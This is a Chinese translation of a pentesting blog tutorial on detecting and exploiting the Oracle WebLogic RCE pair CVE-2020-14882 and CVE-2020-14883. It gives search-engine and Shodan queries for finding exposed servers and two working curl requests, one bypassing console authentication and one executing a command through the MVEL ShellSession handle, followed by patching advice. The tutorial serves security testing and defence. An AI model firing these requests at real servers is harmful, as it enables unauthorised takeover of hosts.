<html>
<head>
<title>How to detect and exploit the Oracle WebLogic RCE (CVE-2020-14882 &amp; CVE-2020-14883) | Pentest-Tools.com</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1>如何检测和利用 Oracle WebLogic RCE(CVE-2020-14882 和 CVE-2020-14883)| Pentest-Tools.com</h1>
<blockquote>原文：<a href="https://pentest-tools.com/blog/detect-exploit-oracle-weblogic-rce-2020#2022-07-08T11:54:32.000Z">https://pentest-tools.com/blog/detect-exploit-oracle-weblogic-rce-2020#2022-07-08T11:54:32.000Z</a></blockquote><div><div class="prose prose-headings:break-words prose-img:rounded-md prose-img:ring-1 prose-img:ring-dark-blue-200 prose-img:ring-opacity-30 prose-code:break-words prose-headings:[scroll-margin-top:120px] xl:prose-lg xl:prose-headings:w-[628px] xl:prose-p:w-[628px]">
            
              
                
                  <p>Pentesters 喜欢好的 RCE，但是，正如我们享受发现和利用它的兴奋(当然是伦理上的)，每次这些东西出现时，技术生态系统都会受到影响。</p><p>这就是为什么快速有效的侦察和漏洞评估仍然是必不可少的测试阶段，可以帮助公司管理风险，以便他们可以继续开展业务并为客户服务。凭借你的知识、经验和建议，他们可以将潜在的危险转化为让他们变得更强大的过程。</p><p>让我们更深入地了解一下在 Oracle WebLogic Server 中发现的严重 RCE 漏洞，看看如何在您的组织内外产生更大的积极影响。</p><h2 id="what-is-oracle-weblogic"><strong>什么是 Oracle WebLogic？</strong></h2><p><strong> WebLogic Server </strong>是基于 Java 的应用服务器；用于开发和部署多层分布式企业应用程序的平台。webLogic Server 集中了应用程序服务，如 Web 服务器功能、业务组件和对后端企业系统的访问，还可以用作高级 Web 应用程序的主 Web 服务器。</p><p>全球超过 7000 家公司使用 WebLogic，这使它成为技术生态系统的重要组成部分。</p><h2 id="how-the-oracle-weblogic-rce-vulnerability-works-cve-2020-14883"><strong>Oracle WebLogic RCE 漏洞的工作原理(CVE-2020-14883) </strong></h2><p><strong> CVE-2020-14882 </strong>允许远程用户绕过管理员控制台组件中的验证。导致此漏洞的原因是服务器 URL 的<strong>路径遍历黑名单</strong>配置不正确，您可以在 WebLogic HTTP access 的处理程序类中找到该黑名单。</p><p>您可以通过使用双编码字符串(如<code>%252e%252e%252fconsole.portal</code>)绕过服务器 URL 的黑名单。</p><p><strong> CVE-2020-14883 </strong>允许未经授权的用户<strong>在管理员控制台组件上执行任何命令</strong>。由此带来的风险是，未经验证的远程攻击者可以通过 HTTP 在 Oracle WebLogic server 上执行任意命令，并且<strong>完全控制主机</strong>。</p><h2 id="vulnerable-oracle-weblogic-versions"><strong>易受攻击的 Oracle WebLogic 版本</strong></h2><p>受影响的受支持版本包括 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0 和 14.1.1.0.0。该漏洞的 CVSSv3 得分为 9.8 ，因为利用它不需要非常复杂的攻击。</p><p>自 2020 年 10 月以来，补丁已经可用，但很可能仍然存在大量易受攻击的实例。</p><h2 id="how-to-find-targets-vulnerable-to-cve-2020-14882-and-cve-2020-14883"><strong>如何找到易受 CVE-2020-14882 和 CVE-2020-14883 攻击的目标</strong></h2><p>您可以使用<strong> Google Dorks </strong>通过以下搜索查询找出使用潜在易受攻击版本的 WebLogic 主机:<strong>inurl:"/console/log in/loginform . JSP "</strong></p><p><img src="../Images/1dfd5f3b3bbea7780e7c946e21056b84.png" alt="Google Dorks result" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWV4cGxvaXQtb3JhY2xlLXdlYmxvZ2ljLXJjZS0yMDIwL3NlYXJjaC1xdWVyeS13aXRoLWdvb2dsZS1kb3Jrcy0xLnBuZw==?s=ae3223237f4694a2f8f434286ae942dd"/></p><p> </p><p>或者，您可以使用 Shodan.io 在互联网上找到一些易受攻击的目标。您可以使用以下 Shodan 查询来查找潜在易受攻击的 WebLogic servers:</p><p><strong>产品:“Oracle WebLogic”</strong></p><p><img src="../Images/882e5dda609936a098eab5fe7c0ebf51.png" alt="Shodan search query results" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWV4cGxvaXQtb3JhY2xlLXdlYmxvZ2ljLXJjZS0yMDIwL3NlYXJjaC1xdWVyeS13aXRoLXNob2Rhbi5wbmc=?s=c45e800d701620ca885f4ce0304d9363"/></p><h2 id="business-impact-of-cve-2020-14882-and-cve-2020-14883"><strong>CVE-2020-14882 和 CVE-2020-14883 </strong>的业务影响</h2><p>通过 RCE 访问，攻击者可以轻松进入 WebLogic server。由于获得了高权限，恶意黑客可以执行任何管理操作并完全控制应用程序。</p><h2 id="how-to-manually-detect-cve-2020-14882-cve-2020-14883-in-ethical-hacking-engagements"><strong>如何在道德黑客活动中手动检测 CVE-2020-14882&amp;CVE-2020-14883</strong></h2><p>首先，您可以通过向双编码端点发送简单的 HTTP GET 请求来绕过控制台组件的身份验证，该端点包含控制台门户页面并执行<strong> CVE-2020-14882 </strong>漏洞。</p>

                

                
              
                
                  <div class="not-prose my-10">
                    

<div x-data="{&#10;  activeTab: 'curl',&#10;  copied: false,&#10;&#10;  setActiveTab(tab) {&#10;    this.activeTab = tab&#10;  },&#10;  async copyCode() {&#10;    const code = this.$refs[`code-${this.activeTab}`]&#10;&#10;    if (!code) return&#10;    if (!code.textContent) return&#10;&#10;    await navigator.clipboard.writeText(code.textContent.trim())&#10;    this.copied = true&#10;    await new Promise((resolve) =&gt; setTimeout(resolve, 1000))&#10;    this.copied = false&#10;  },&#10;}" class="not-prose code-block-group relative z-10 -mx-6 flex max-w-2xl flex-col sm:mx-0 xl:sticky xl:top-26 xl:h-auto xl:max-h-128">
  <div class="relative flex h-full overflow-hidden bg-[#011627] shadow-2xl shadow-dark-blue-300 sm:rounded-xl">
    <div class="relative flex w-full flex-col">
      

      <div class="relative z-10 flex min-h-0 flex-auto flex-col border-t border-white border-opacity-10">
        

        <div class="group flex min-h-0 flex-auto flex-col">
          <div x-show="'curl' === activeTab" class="code-block relative flex min-h-0 w-full flex-auto flex-col">
  <p aria-hidden="true" class="absolute inset-y-0 left-0 z-10 w-12 bg-[#00111f]"/>

  <div x-ref="code-curl" class="content-highlight h-full min-h-0 flex-auto overflow-auto">
    <pre class="shiki"><code><span class="line"><span>curl -k -X </span><span>"</span><span>GET</span><span>"</span><span> https://</span><span>&lt;</span><span>HOST</span><span>&gt;</span><span>/console/css/%252e%252e%252fconsole.portal</span></span></code></pre>
  </div>

  
</div>
        </div>
      </div>
    </div>
  </div>
</div>

                  </div>

                

                
              
                
                  <p>此 HTTP GET 请求会将您重定向到管理员控制台页面，这将绕过身份验证，从而确认您的目标服务器易受攻击。</p><p>然后，您将连接到目标域，并能够配置、监视和控制应用程序。</p><p>通过利用<strong> CVE-2020-14883，</strong>你可以在<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>类的句柄下通过 MVEL 表达式发送命令。这会导致远程代码执行，使得未经验证的恶意攻击者能够在服务器上执行任意代码。</p>

                

                
              
                
                  <div class="not-prose my-10">
                    

<div x-data="{&#10;  activeTab: 'curl',&#10;  copied: false,&#10;&#10;  setActiveTab(tab) {&#10;    this.activeTab = tab&#10;  },&#10;  async copyCode() {&#10;    const code = this.$refs[`code-${this.activeTab}`]&#10;&#10;    if (!code) return&#10;    if (!code.textContent) return&#10;&#10;    await navigator.clipboard.writeText(code.textContent.trim())&#10;    this.copied = true&#10;    await new Promise((resolve) =&gt; setTimeout(resolve, 1000))&#10;    this.copied = false&#10;  },&#10;}" class="not-prose code-block-group relative z-10 -mx-6 flex max-w-2xl flex-col sm:mx-0 xl:sticky xl:top-26 xl:h-auto xl:max-h-128">
  <div class="relative flex h-full overflow-hidden bg-[#011627] shadow-2xl shadow-dark-blue-300 sm:rounded-xl">
    <div class="relative flex w-full flex-col">
      

      <div class="relative z-10 flex min-h-0 flex-auto flex-col border-t border-white border-opacity-10">
        

        <div class="group flex min-h-0 flex-auto flex-col">
          <div x-show="'curl' === activeTab" class="code-block relative flex min-h-0 w-full flex-auto flex-col">
  <p aria-hidden="true" class="absolute inset-y-0 left-0 z-10 w-12 bg-[#00111f]"/>

  <div x-ref="code-curl" class="content-highlight h-full min-h-0 flex-auto overflow-auto">
    <pre class="shiki"><code><span class="line"><span>curl -k -X </span><span>"</span><span>GET</span><span>"</span><span> https://</span><span>&lt;</span><span>HOST</span><span>&gt;</span><span>/console/css/%252e%252e%252fconsole.portal</span><span>?</span><span>_nfpb=true</span><span>&amp;</span><span>_pageLabel=</span><span>&amp;</span><span>handle=com.tangosol.coherence.mvel2.sh.ShellSession(</span><span>"</span><span>java.lang.Runtime.getRuntime().exec('touch%20/tmp/pentest00ls');</span><span>"</span><span>)</span></span></code></pre>
  </div>

  
</div>
        </div>
      </div>
    </div>
  </div>
</div>

                  </div>

                

                
              
                
                  <p>该 HTTP GET 请求将在目标系统的/tmp 目录中创建一个文件，并触发远程代码执行。</p><p>如果你想尝试另一种更快的探测策略，你可以使用 Pentest-Tools.com</p><h2 id="how-to-mitigate-cve-2020-14882-cve-2020-14883"><strong>如何缓解 CVE-2020-14882&amp;CVE-2020-14883</strong></h2><p>你可以阅读<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.oracle.com/security-alerts/cpuoct2020.html">甲骨文关键补丁更新咨询</a>并遵循他们推荐的步骤。此外，您应该尽可能将 WebLogic server 更新到最新版本。</p><p>这不是你听到的最后一个 RCE 漏洞。谁知道今年或明年(或后年)会出现多少更严重的漏洞？</p><p>有所不同的是有一个流程来区分最有价值的资产的优先级，并知道如何在它们受到高度可利用的漏洞影响时进行验证。</p><p>通过我们的实用测试指南，我们为您提供专业知识、有用的方法和有价值的见解，扩展您的知识和能力。如果您有任何需要我们报道的具体内容，请告诉我们。</p>

                

                
              
            
          </div>
        </div>    
</body>
</html>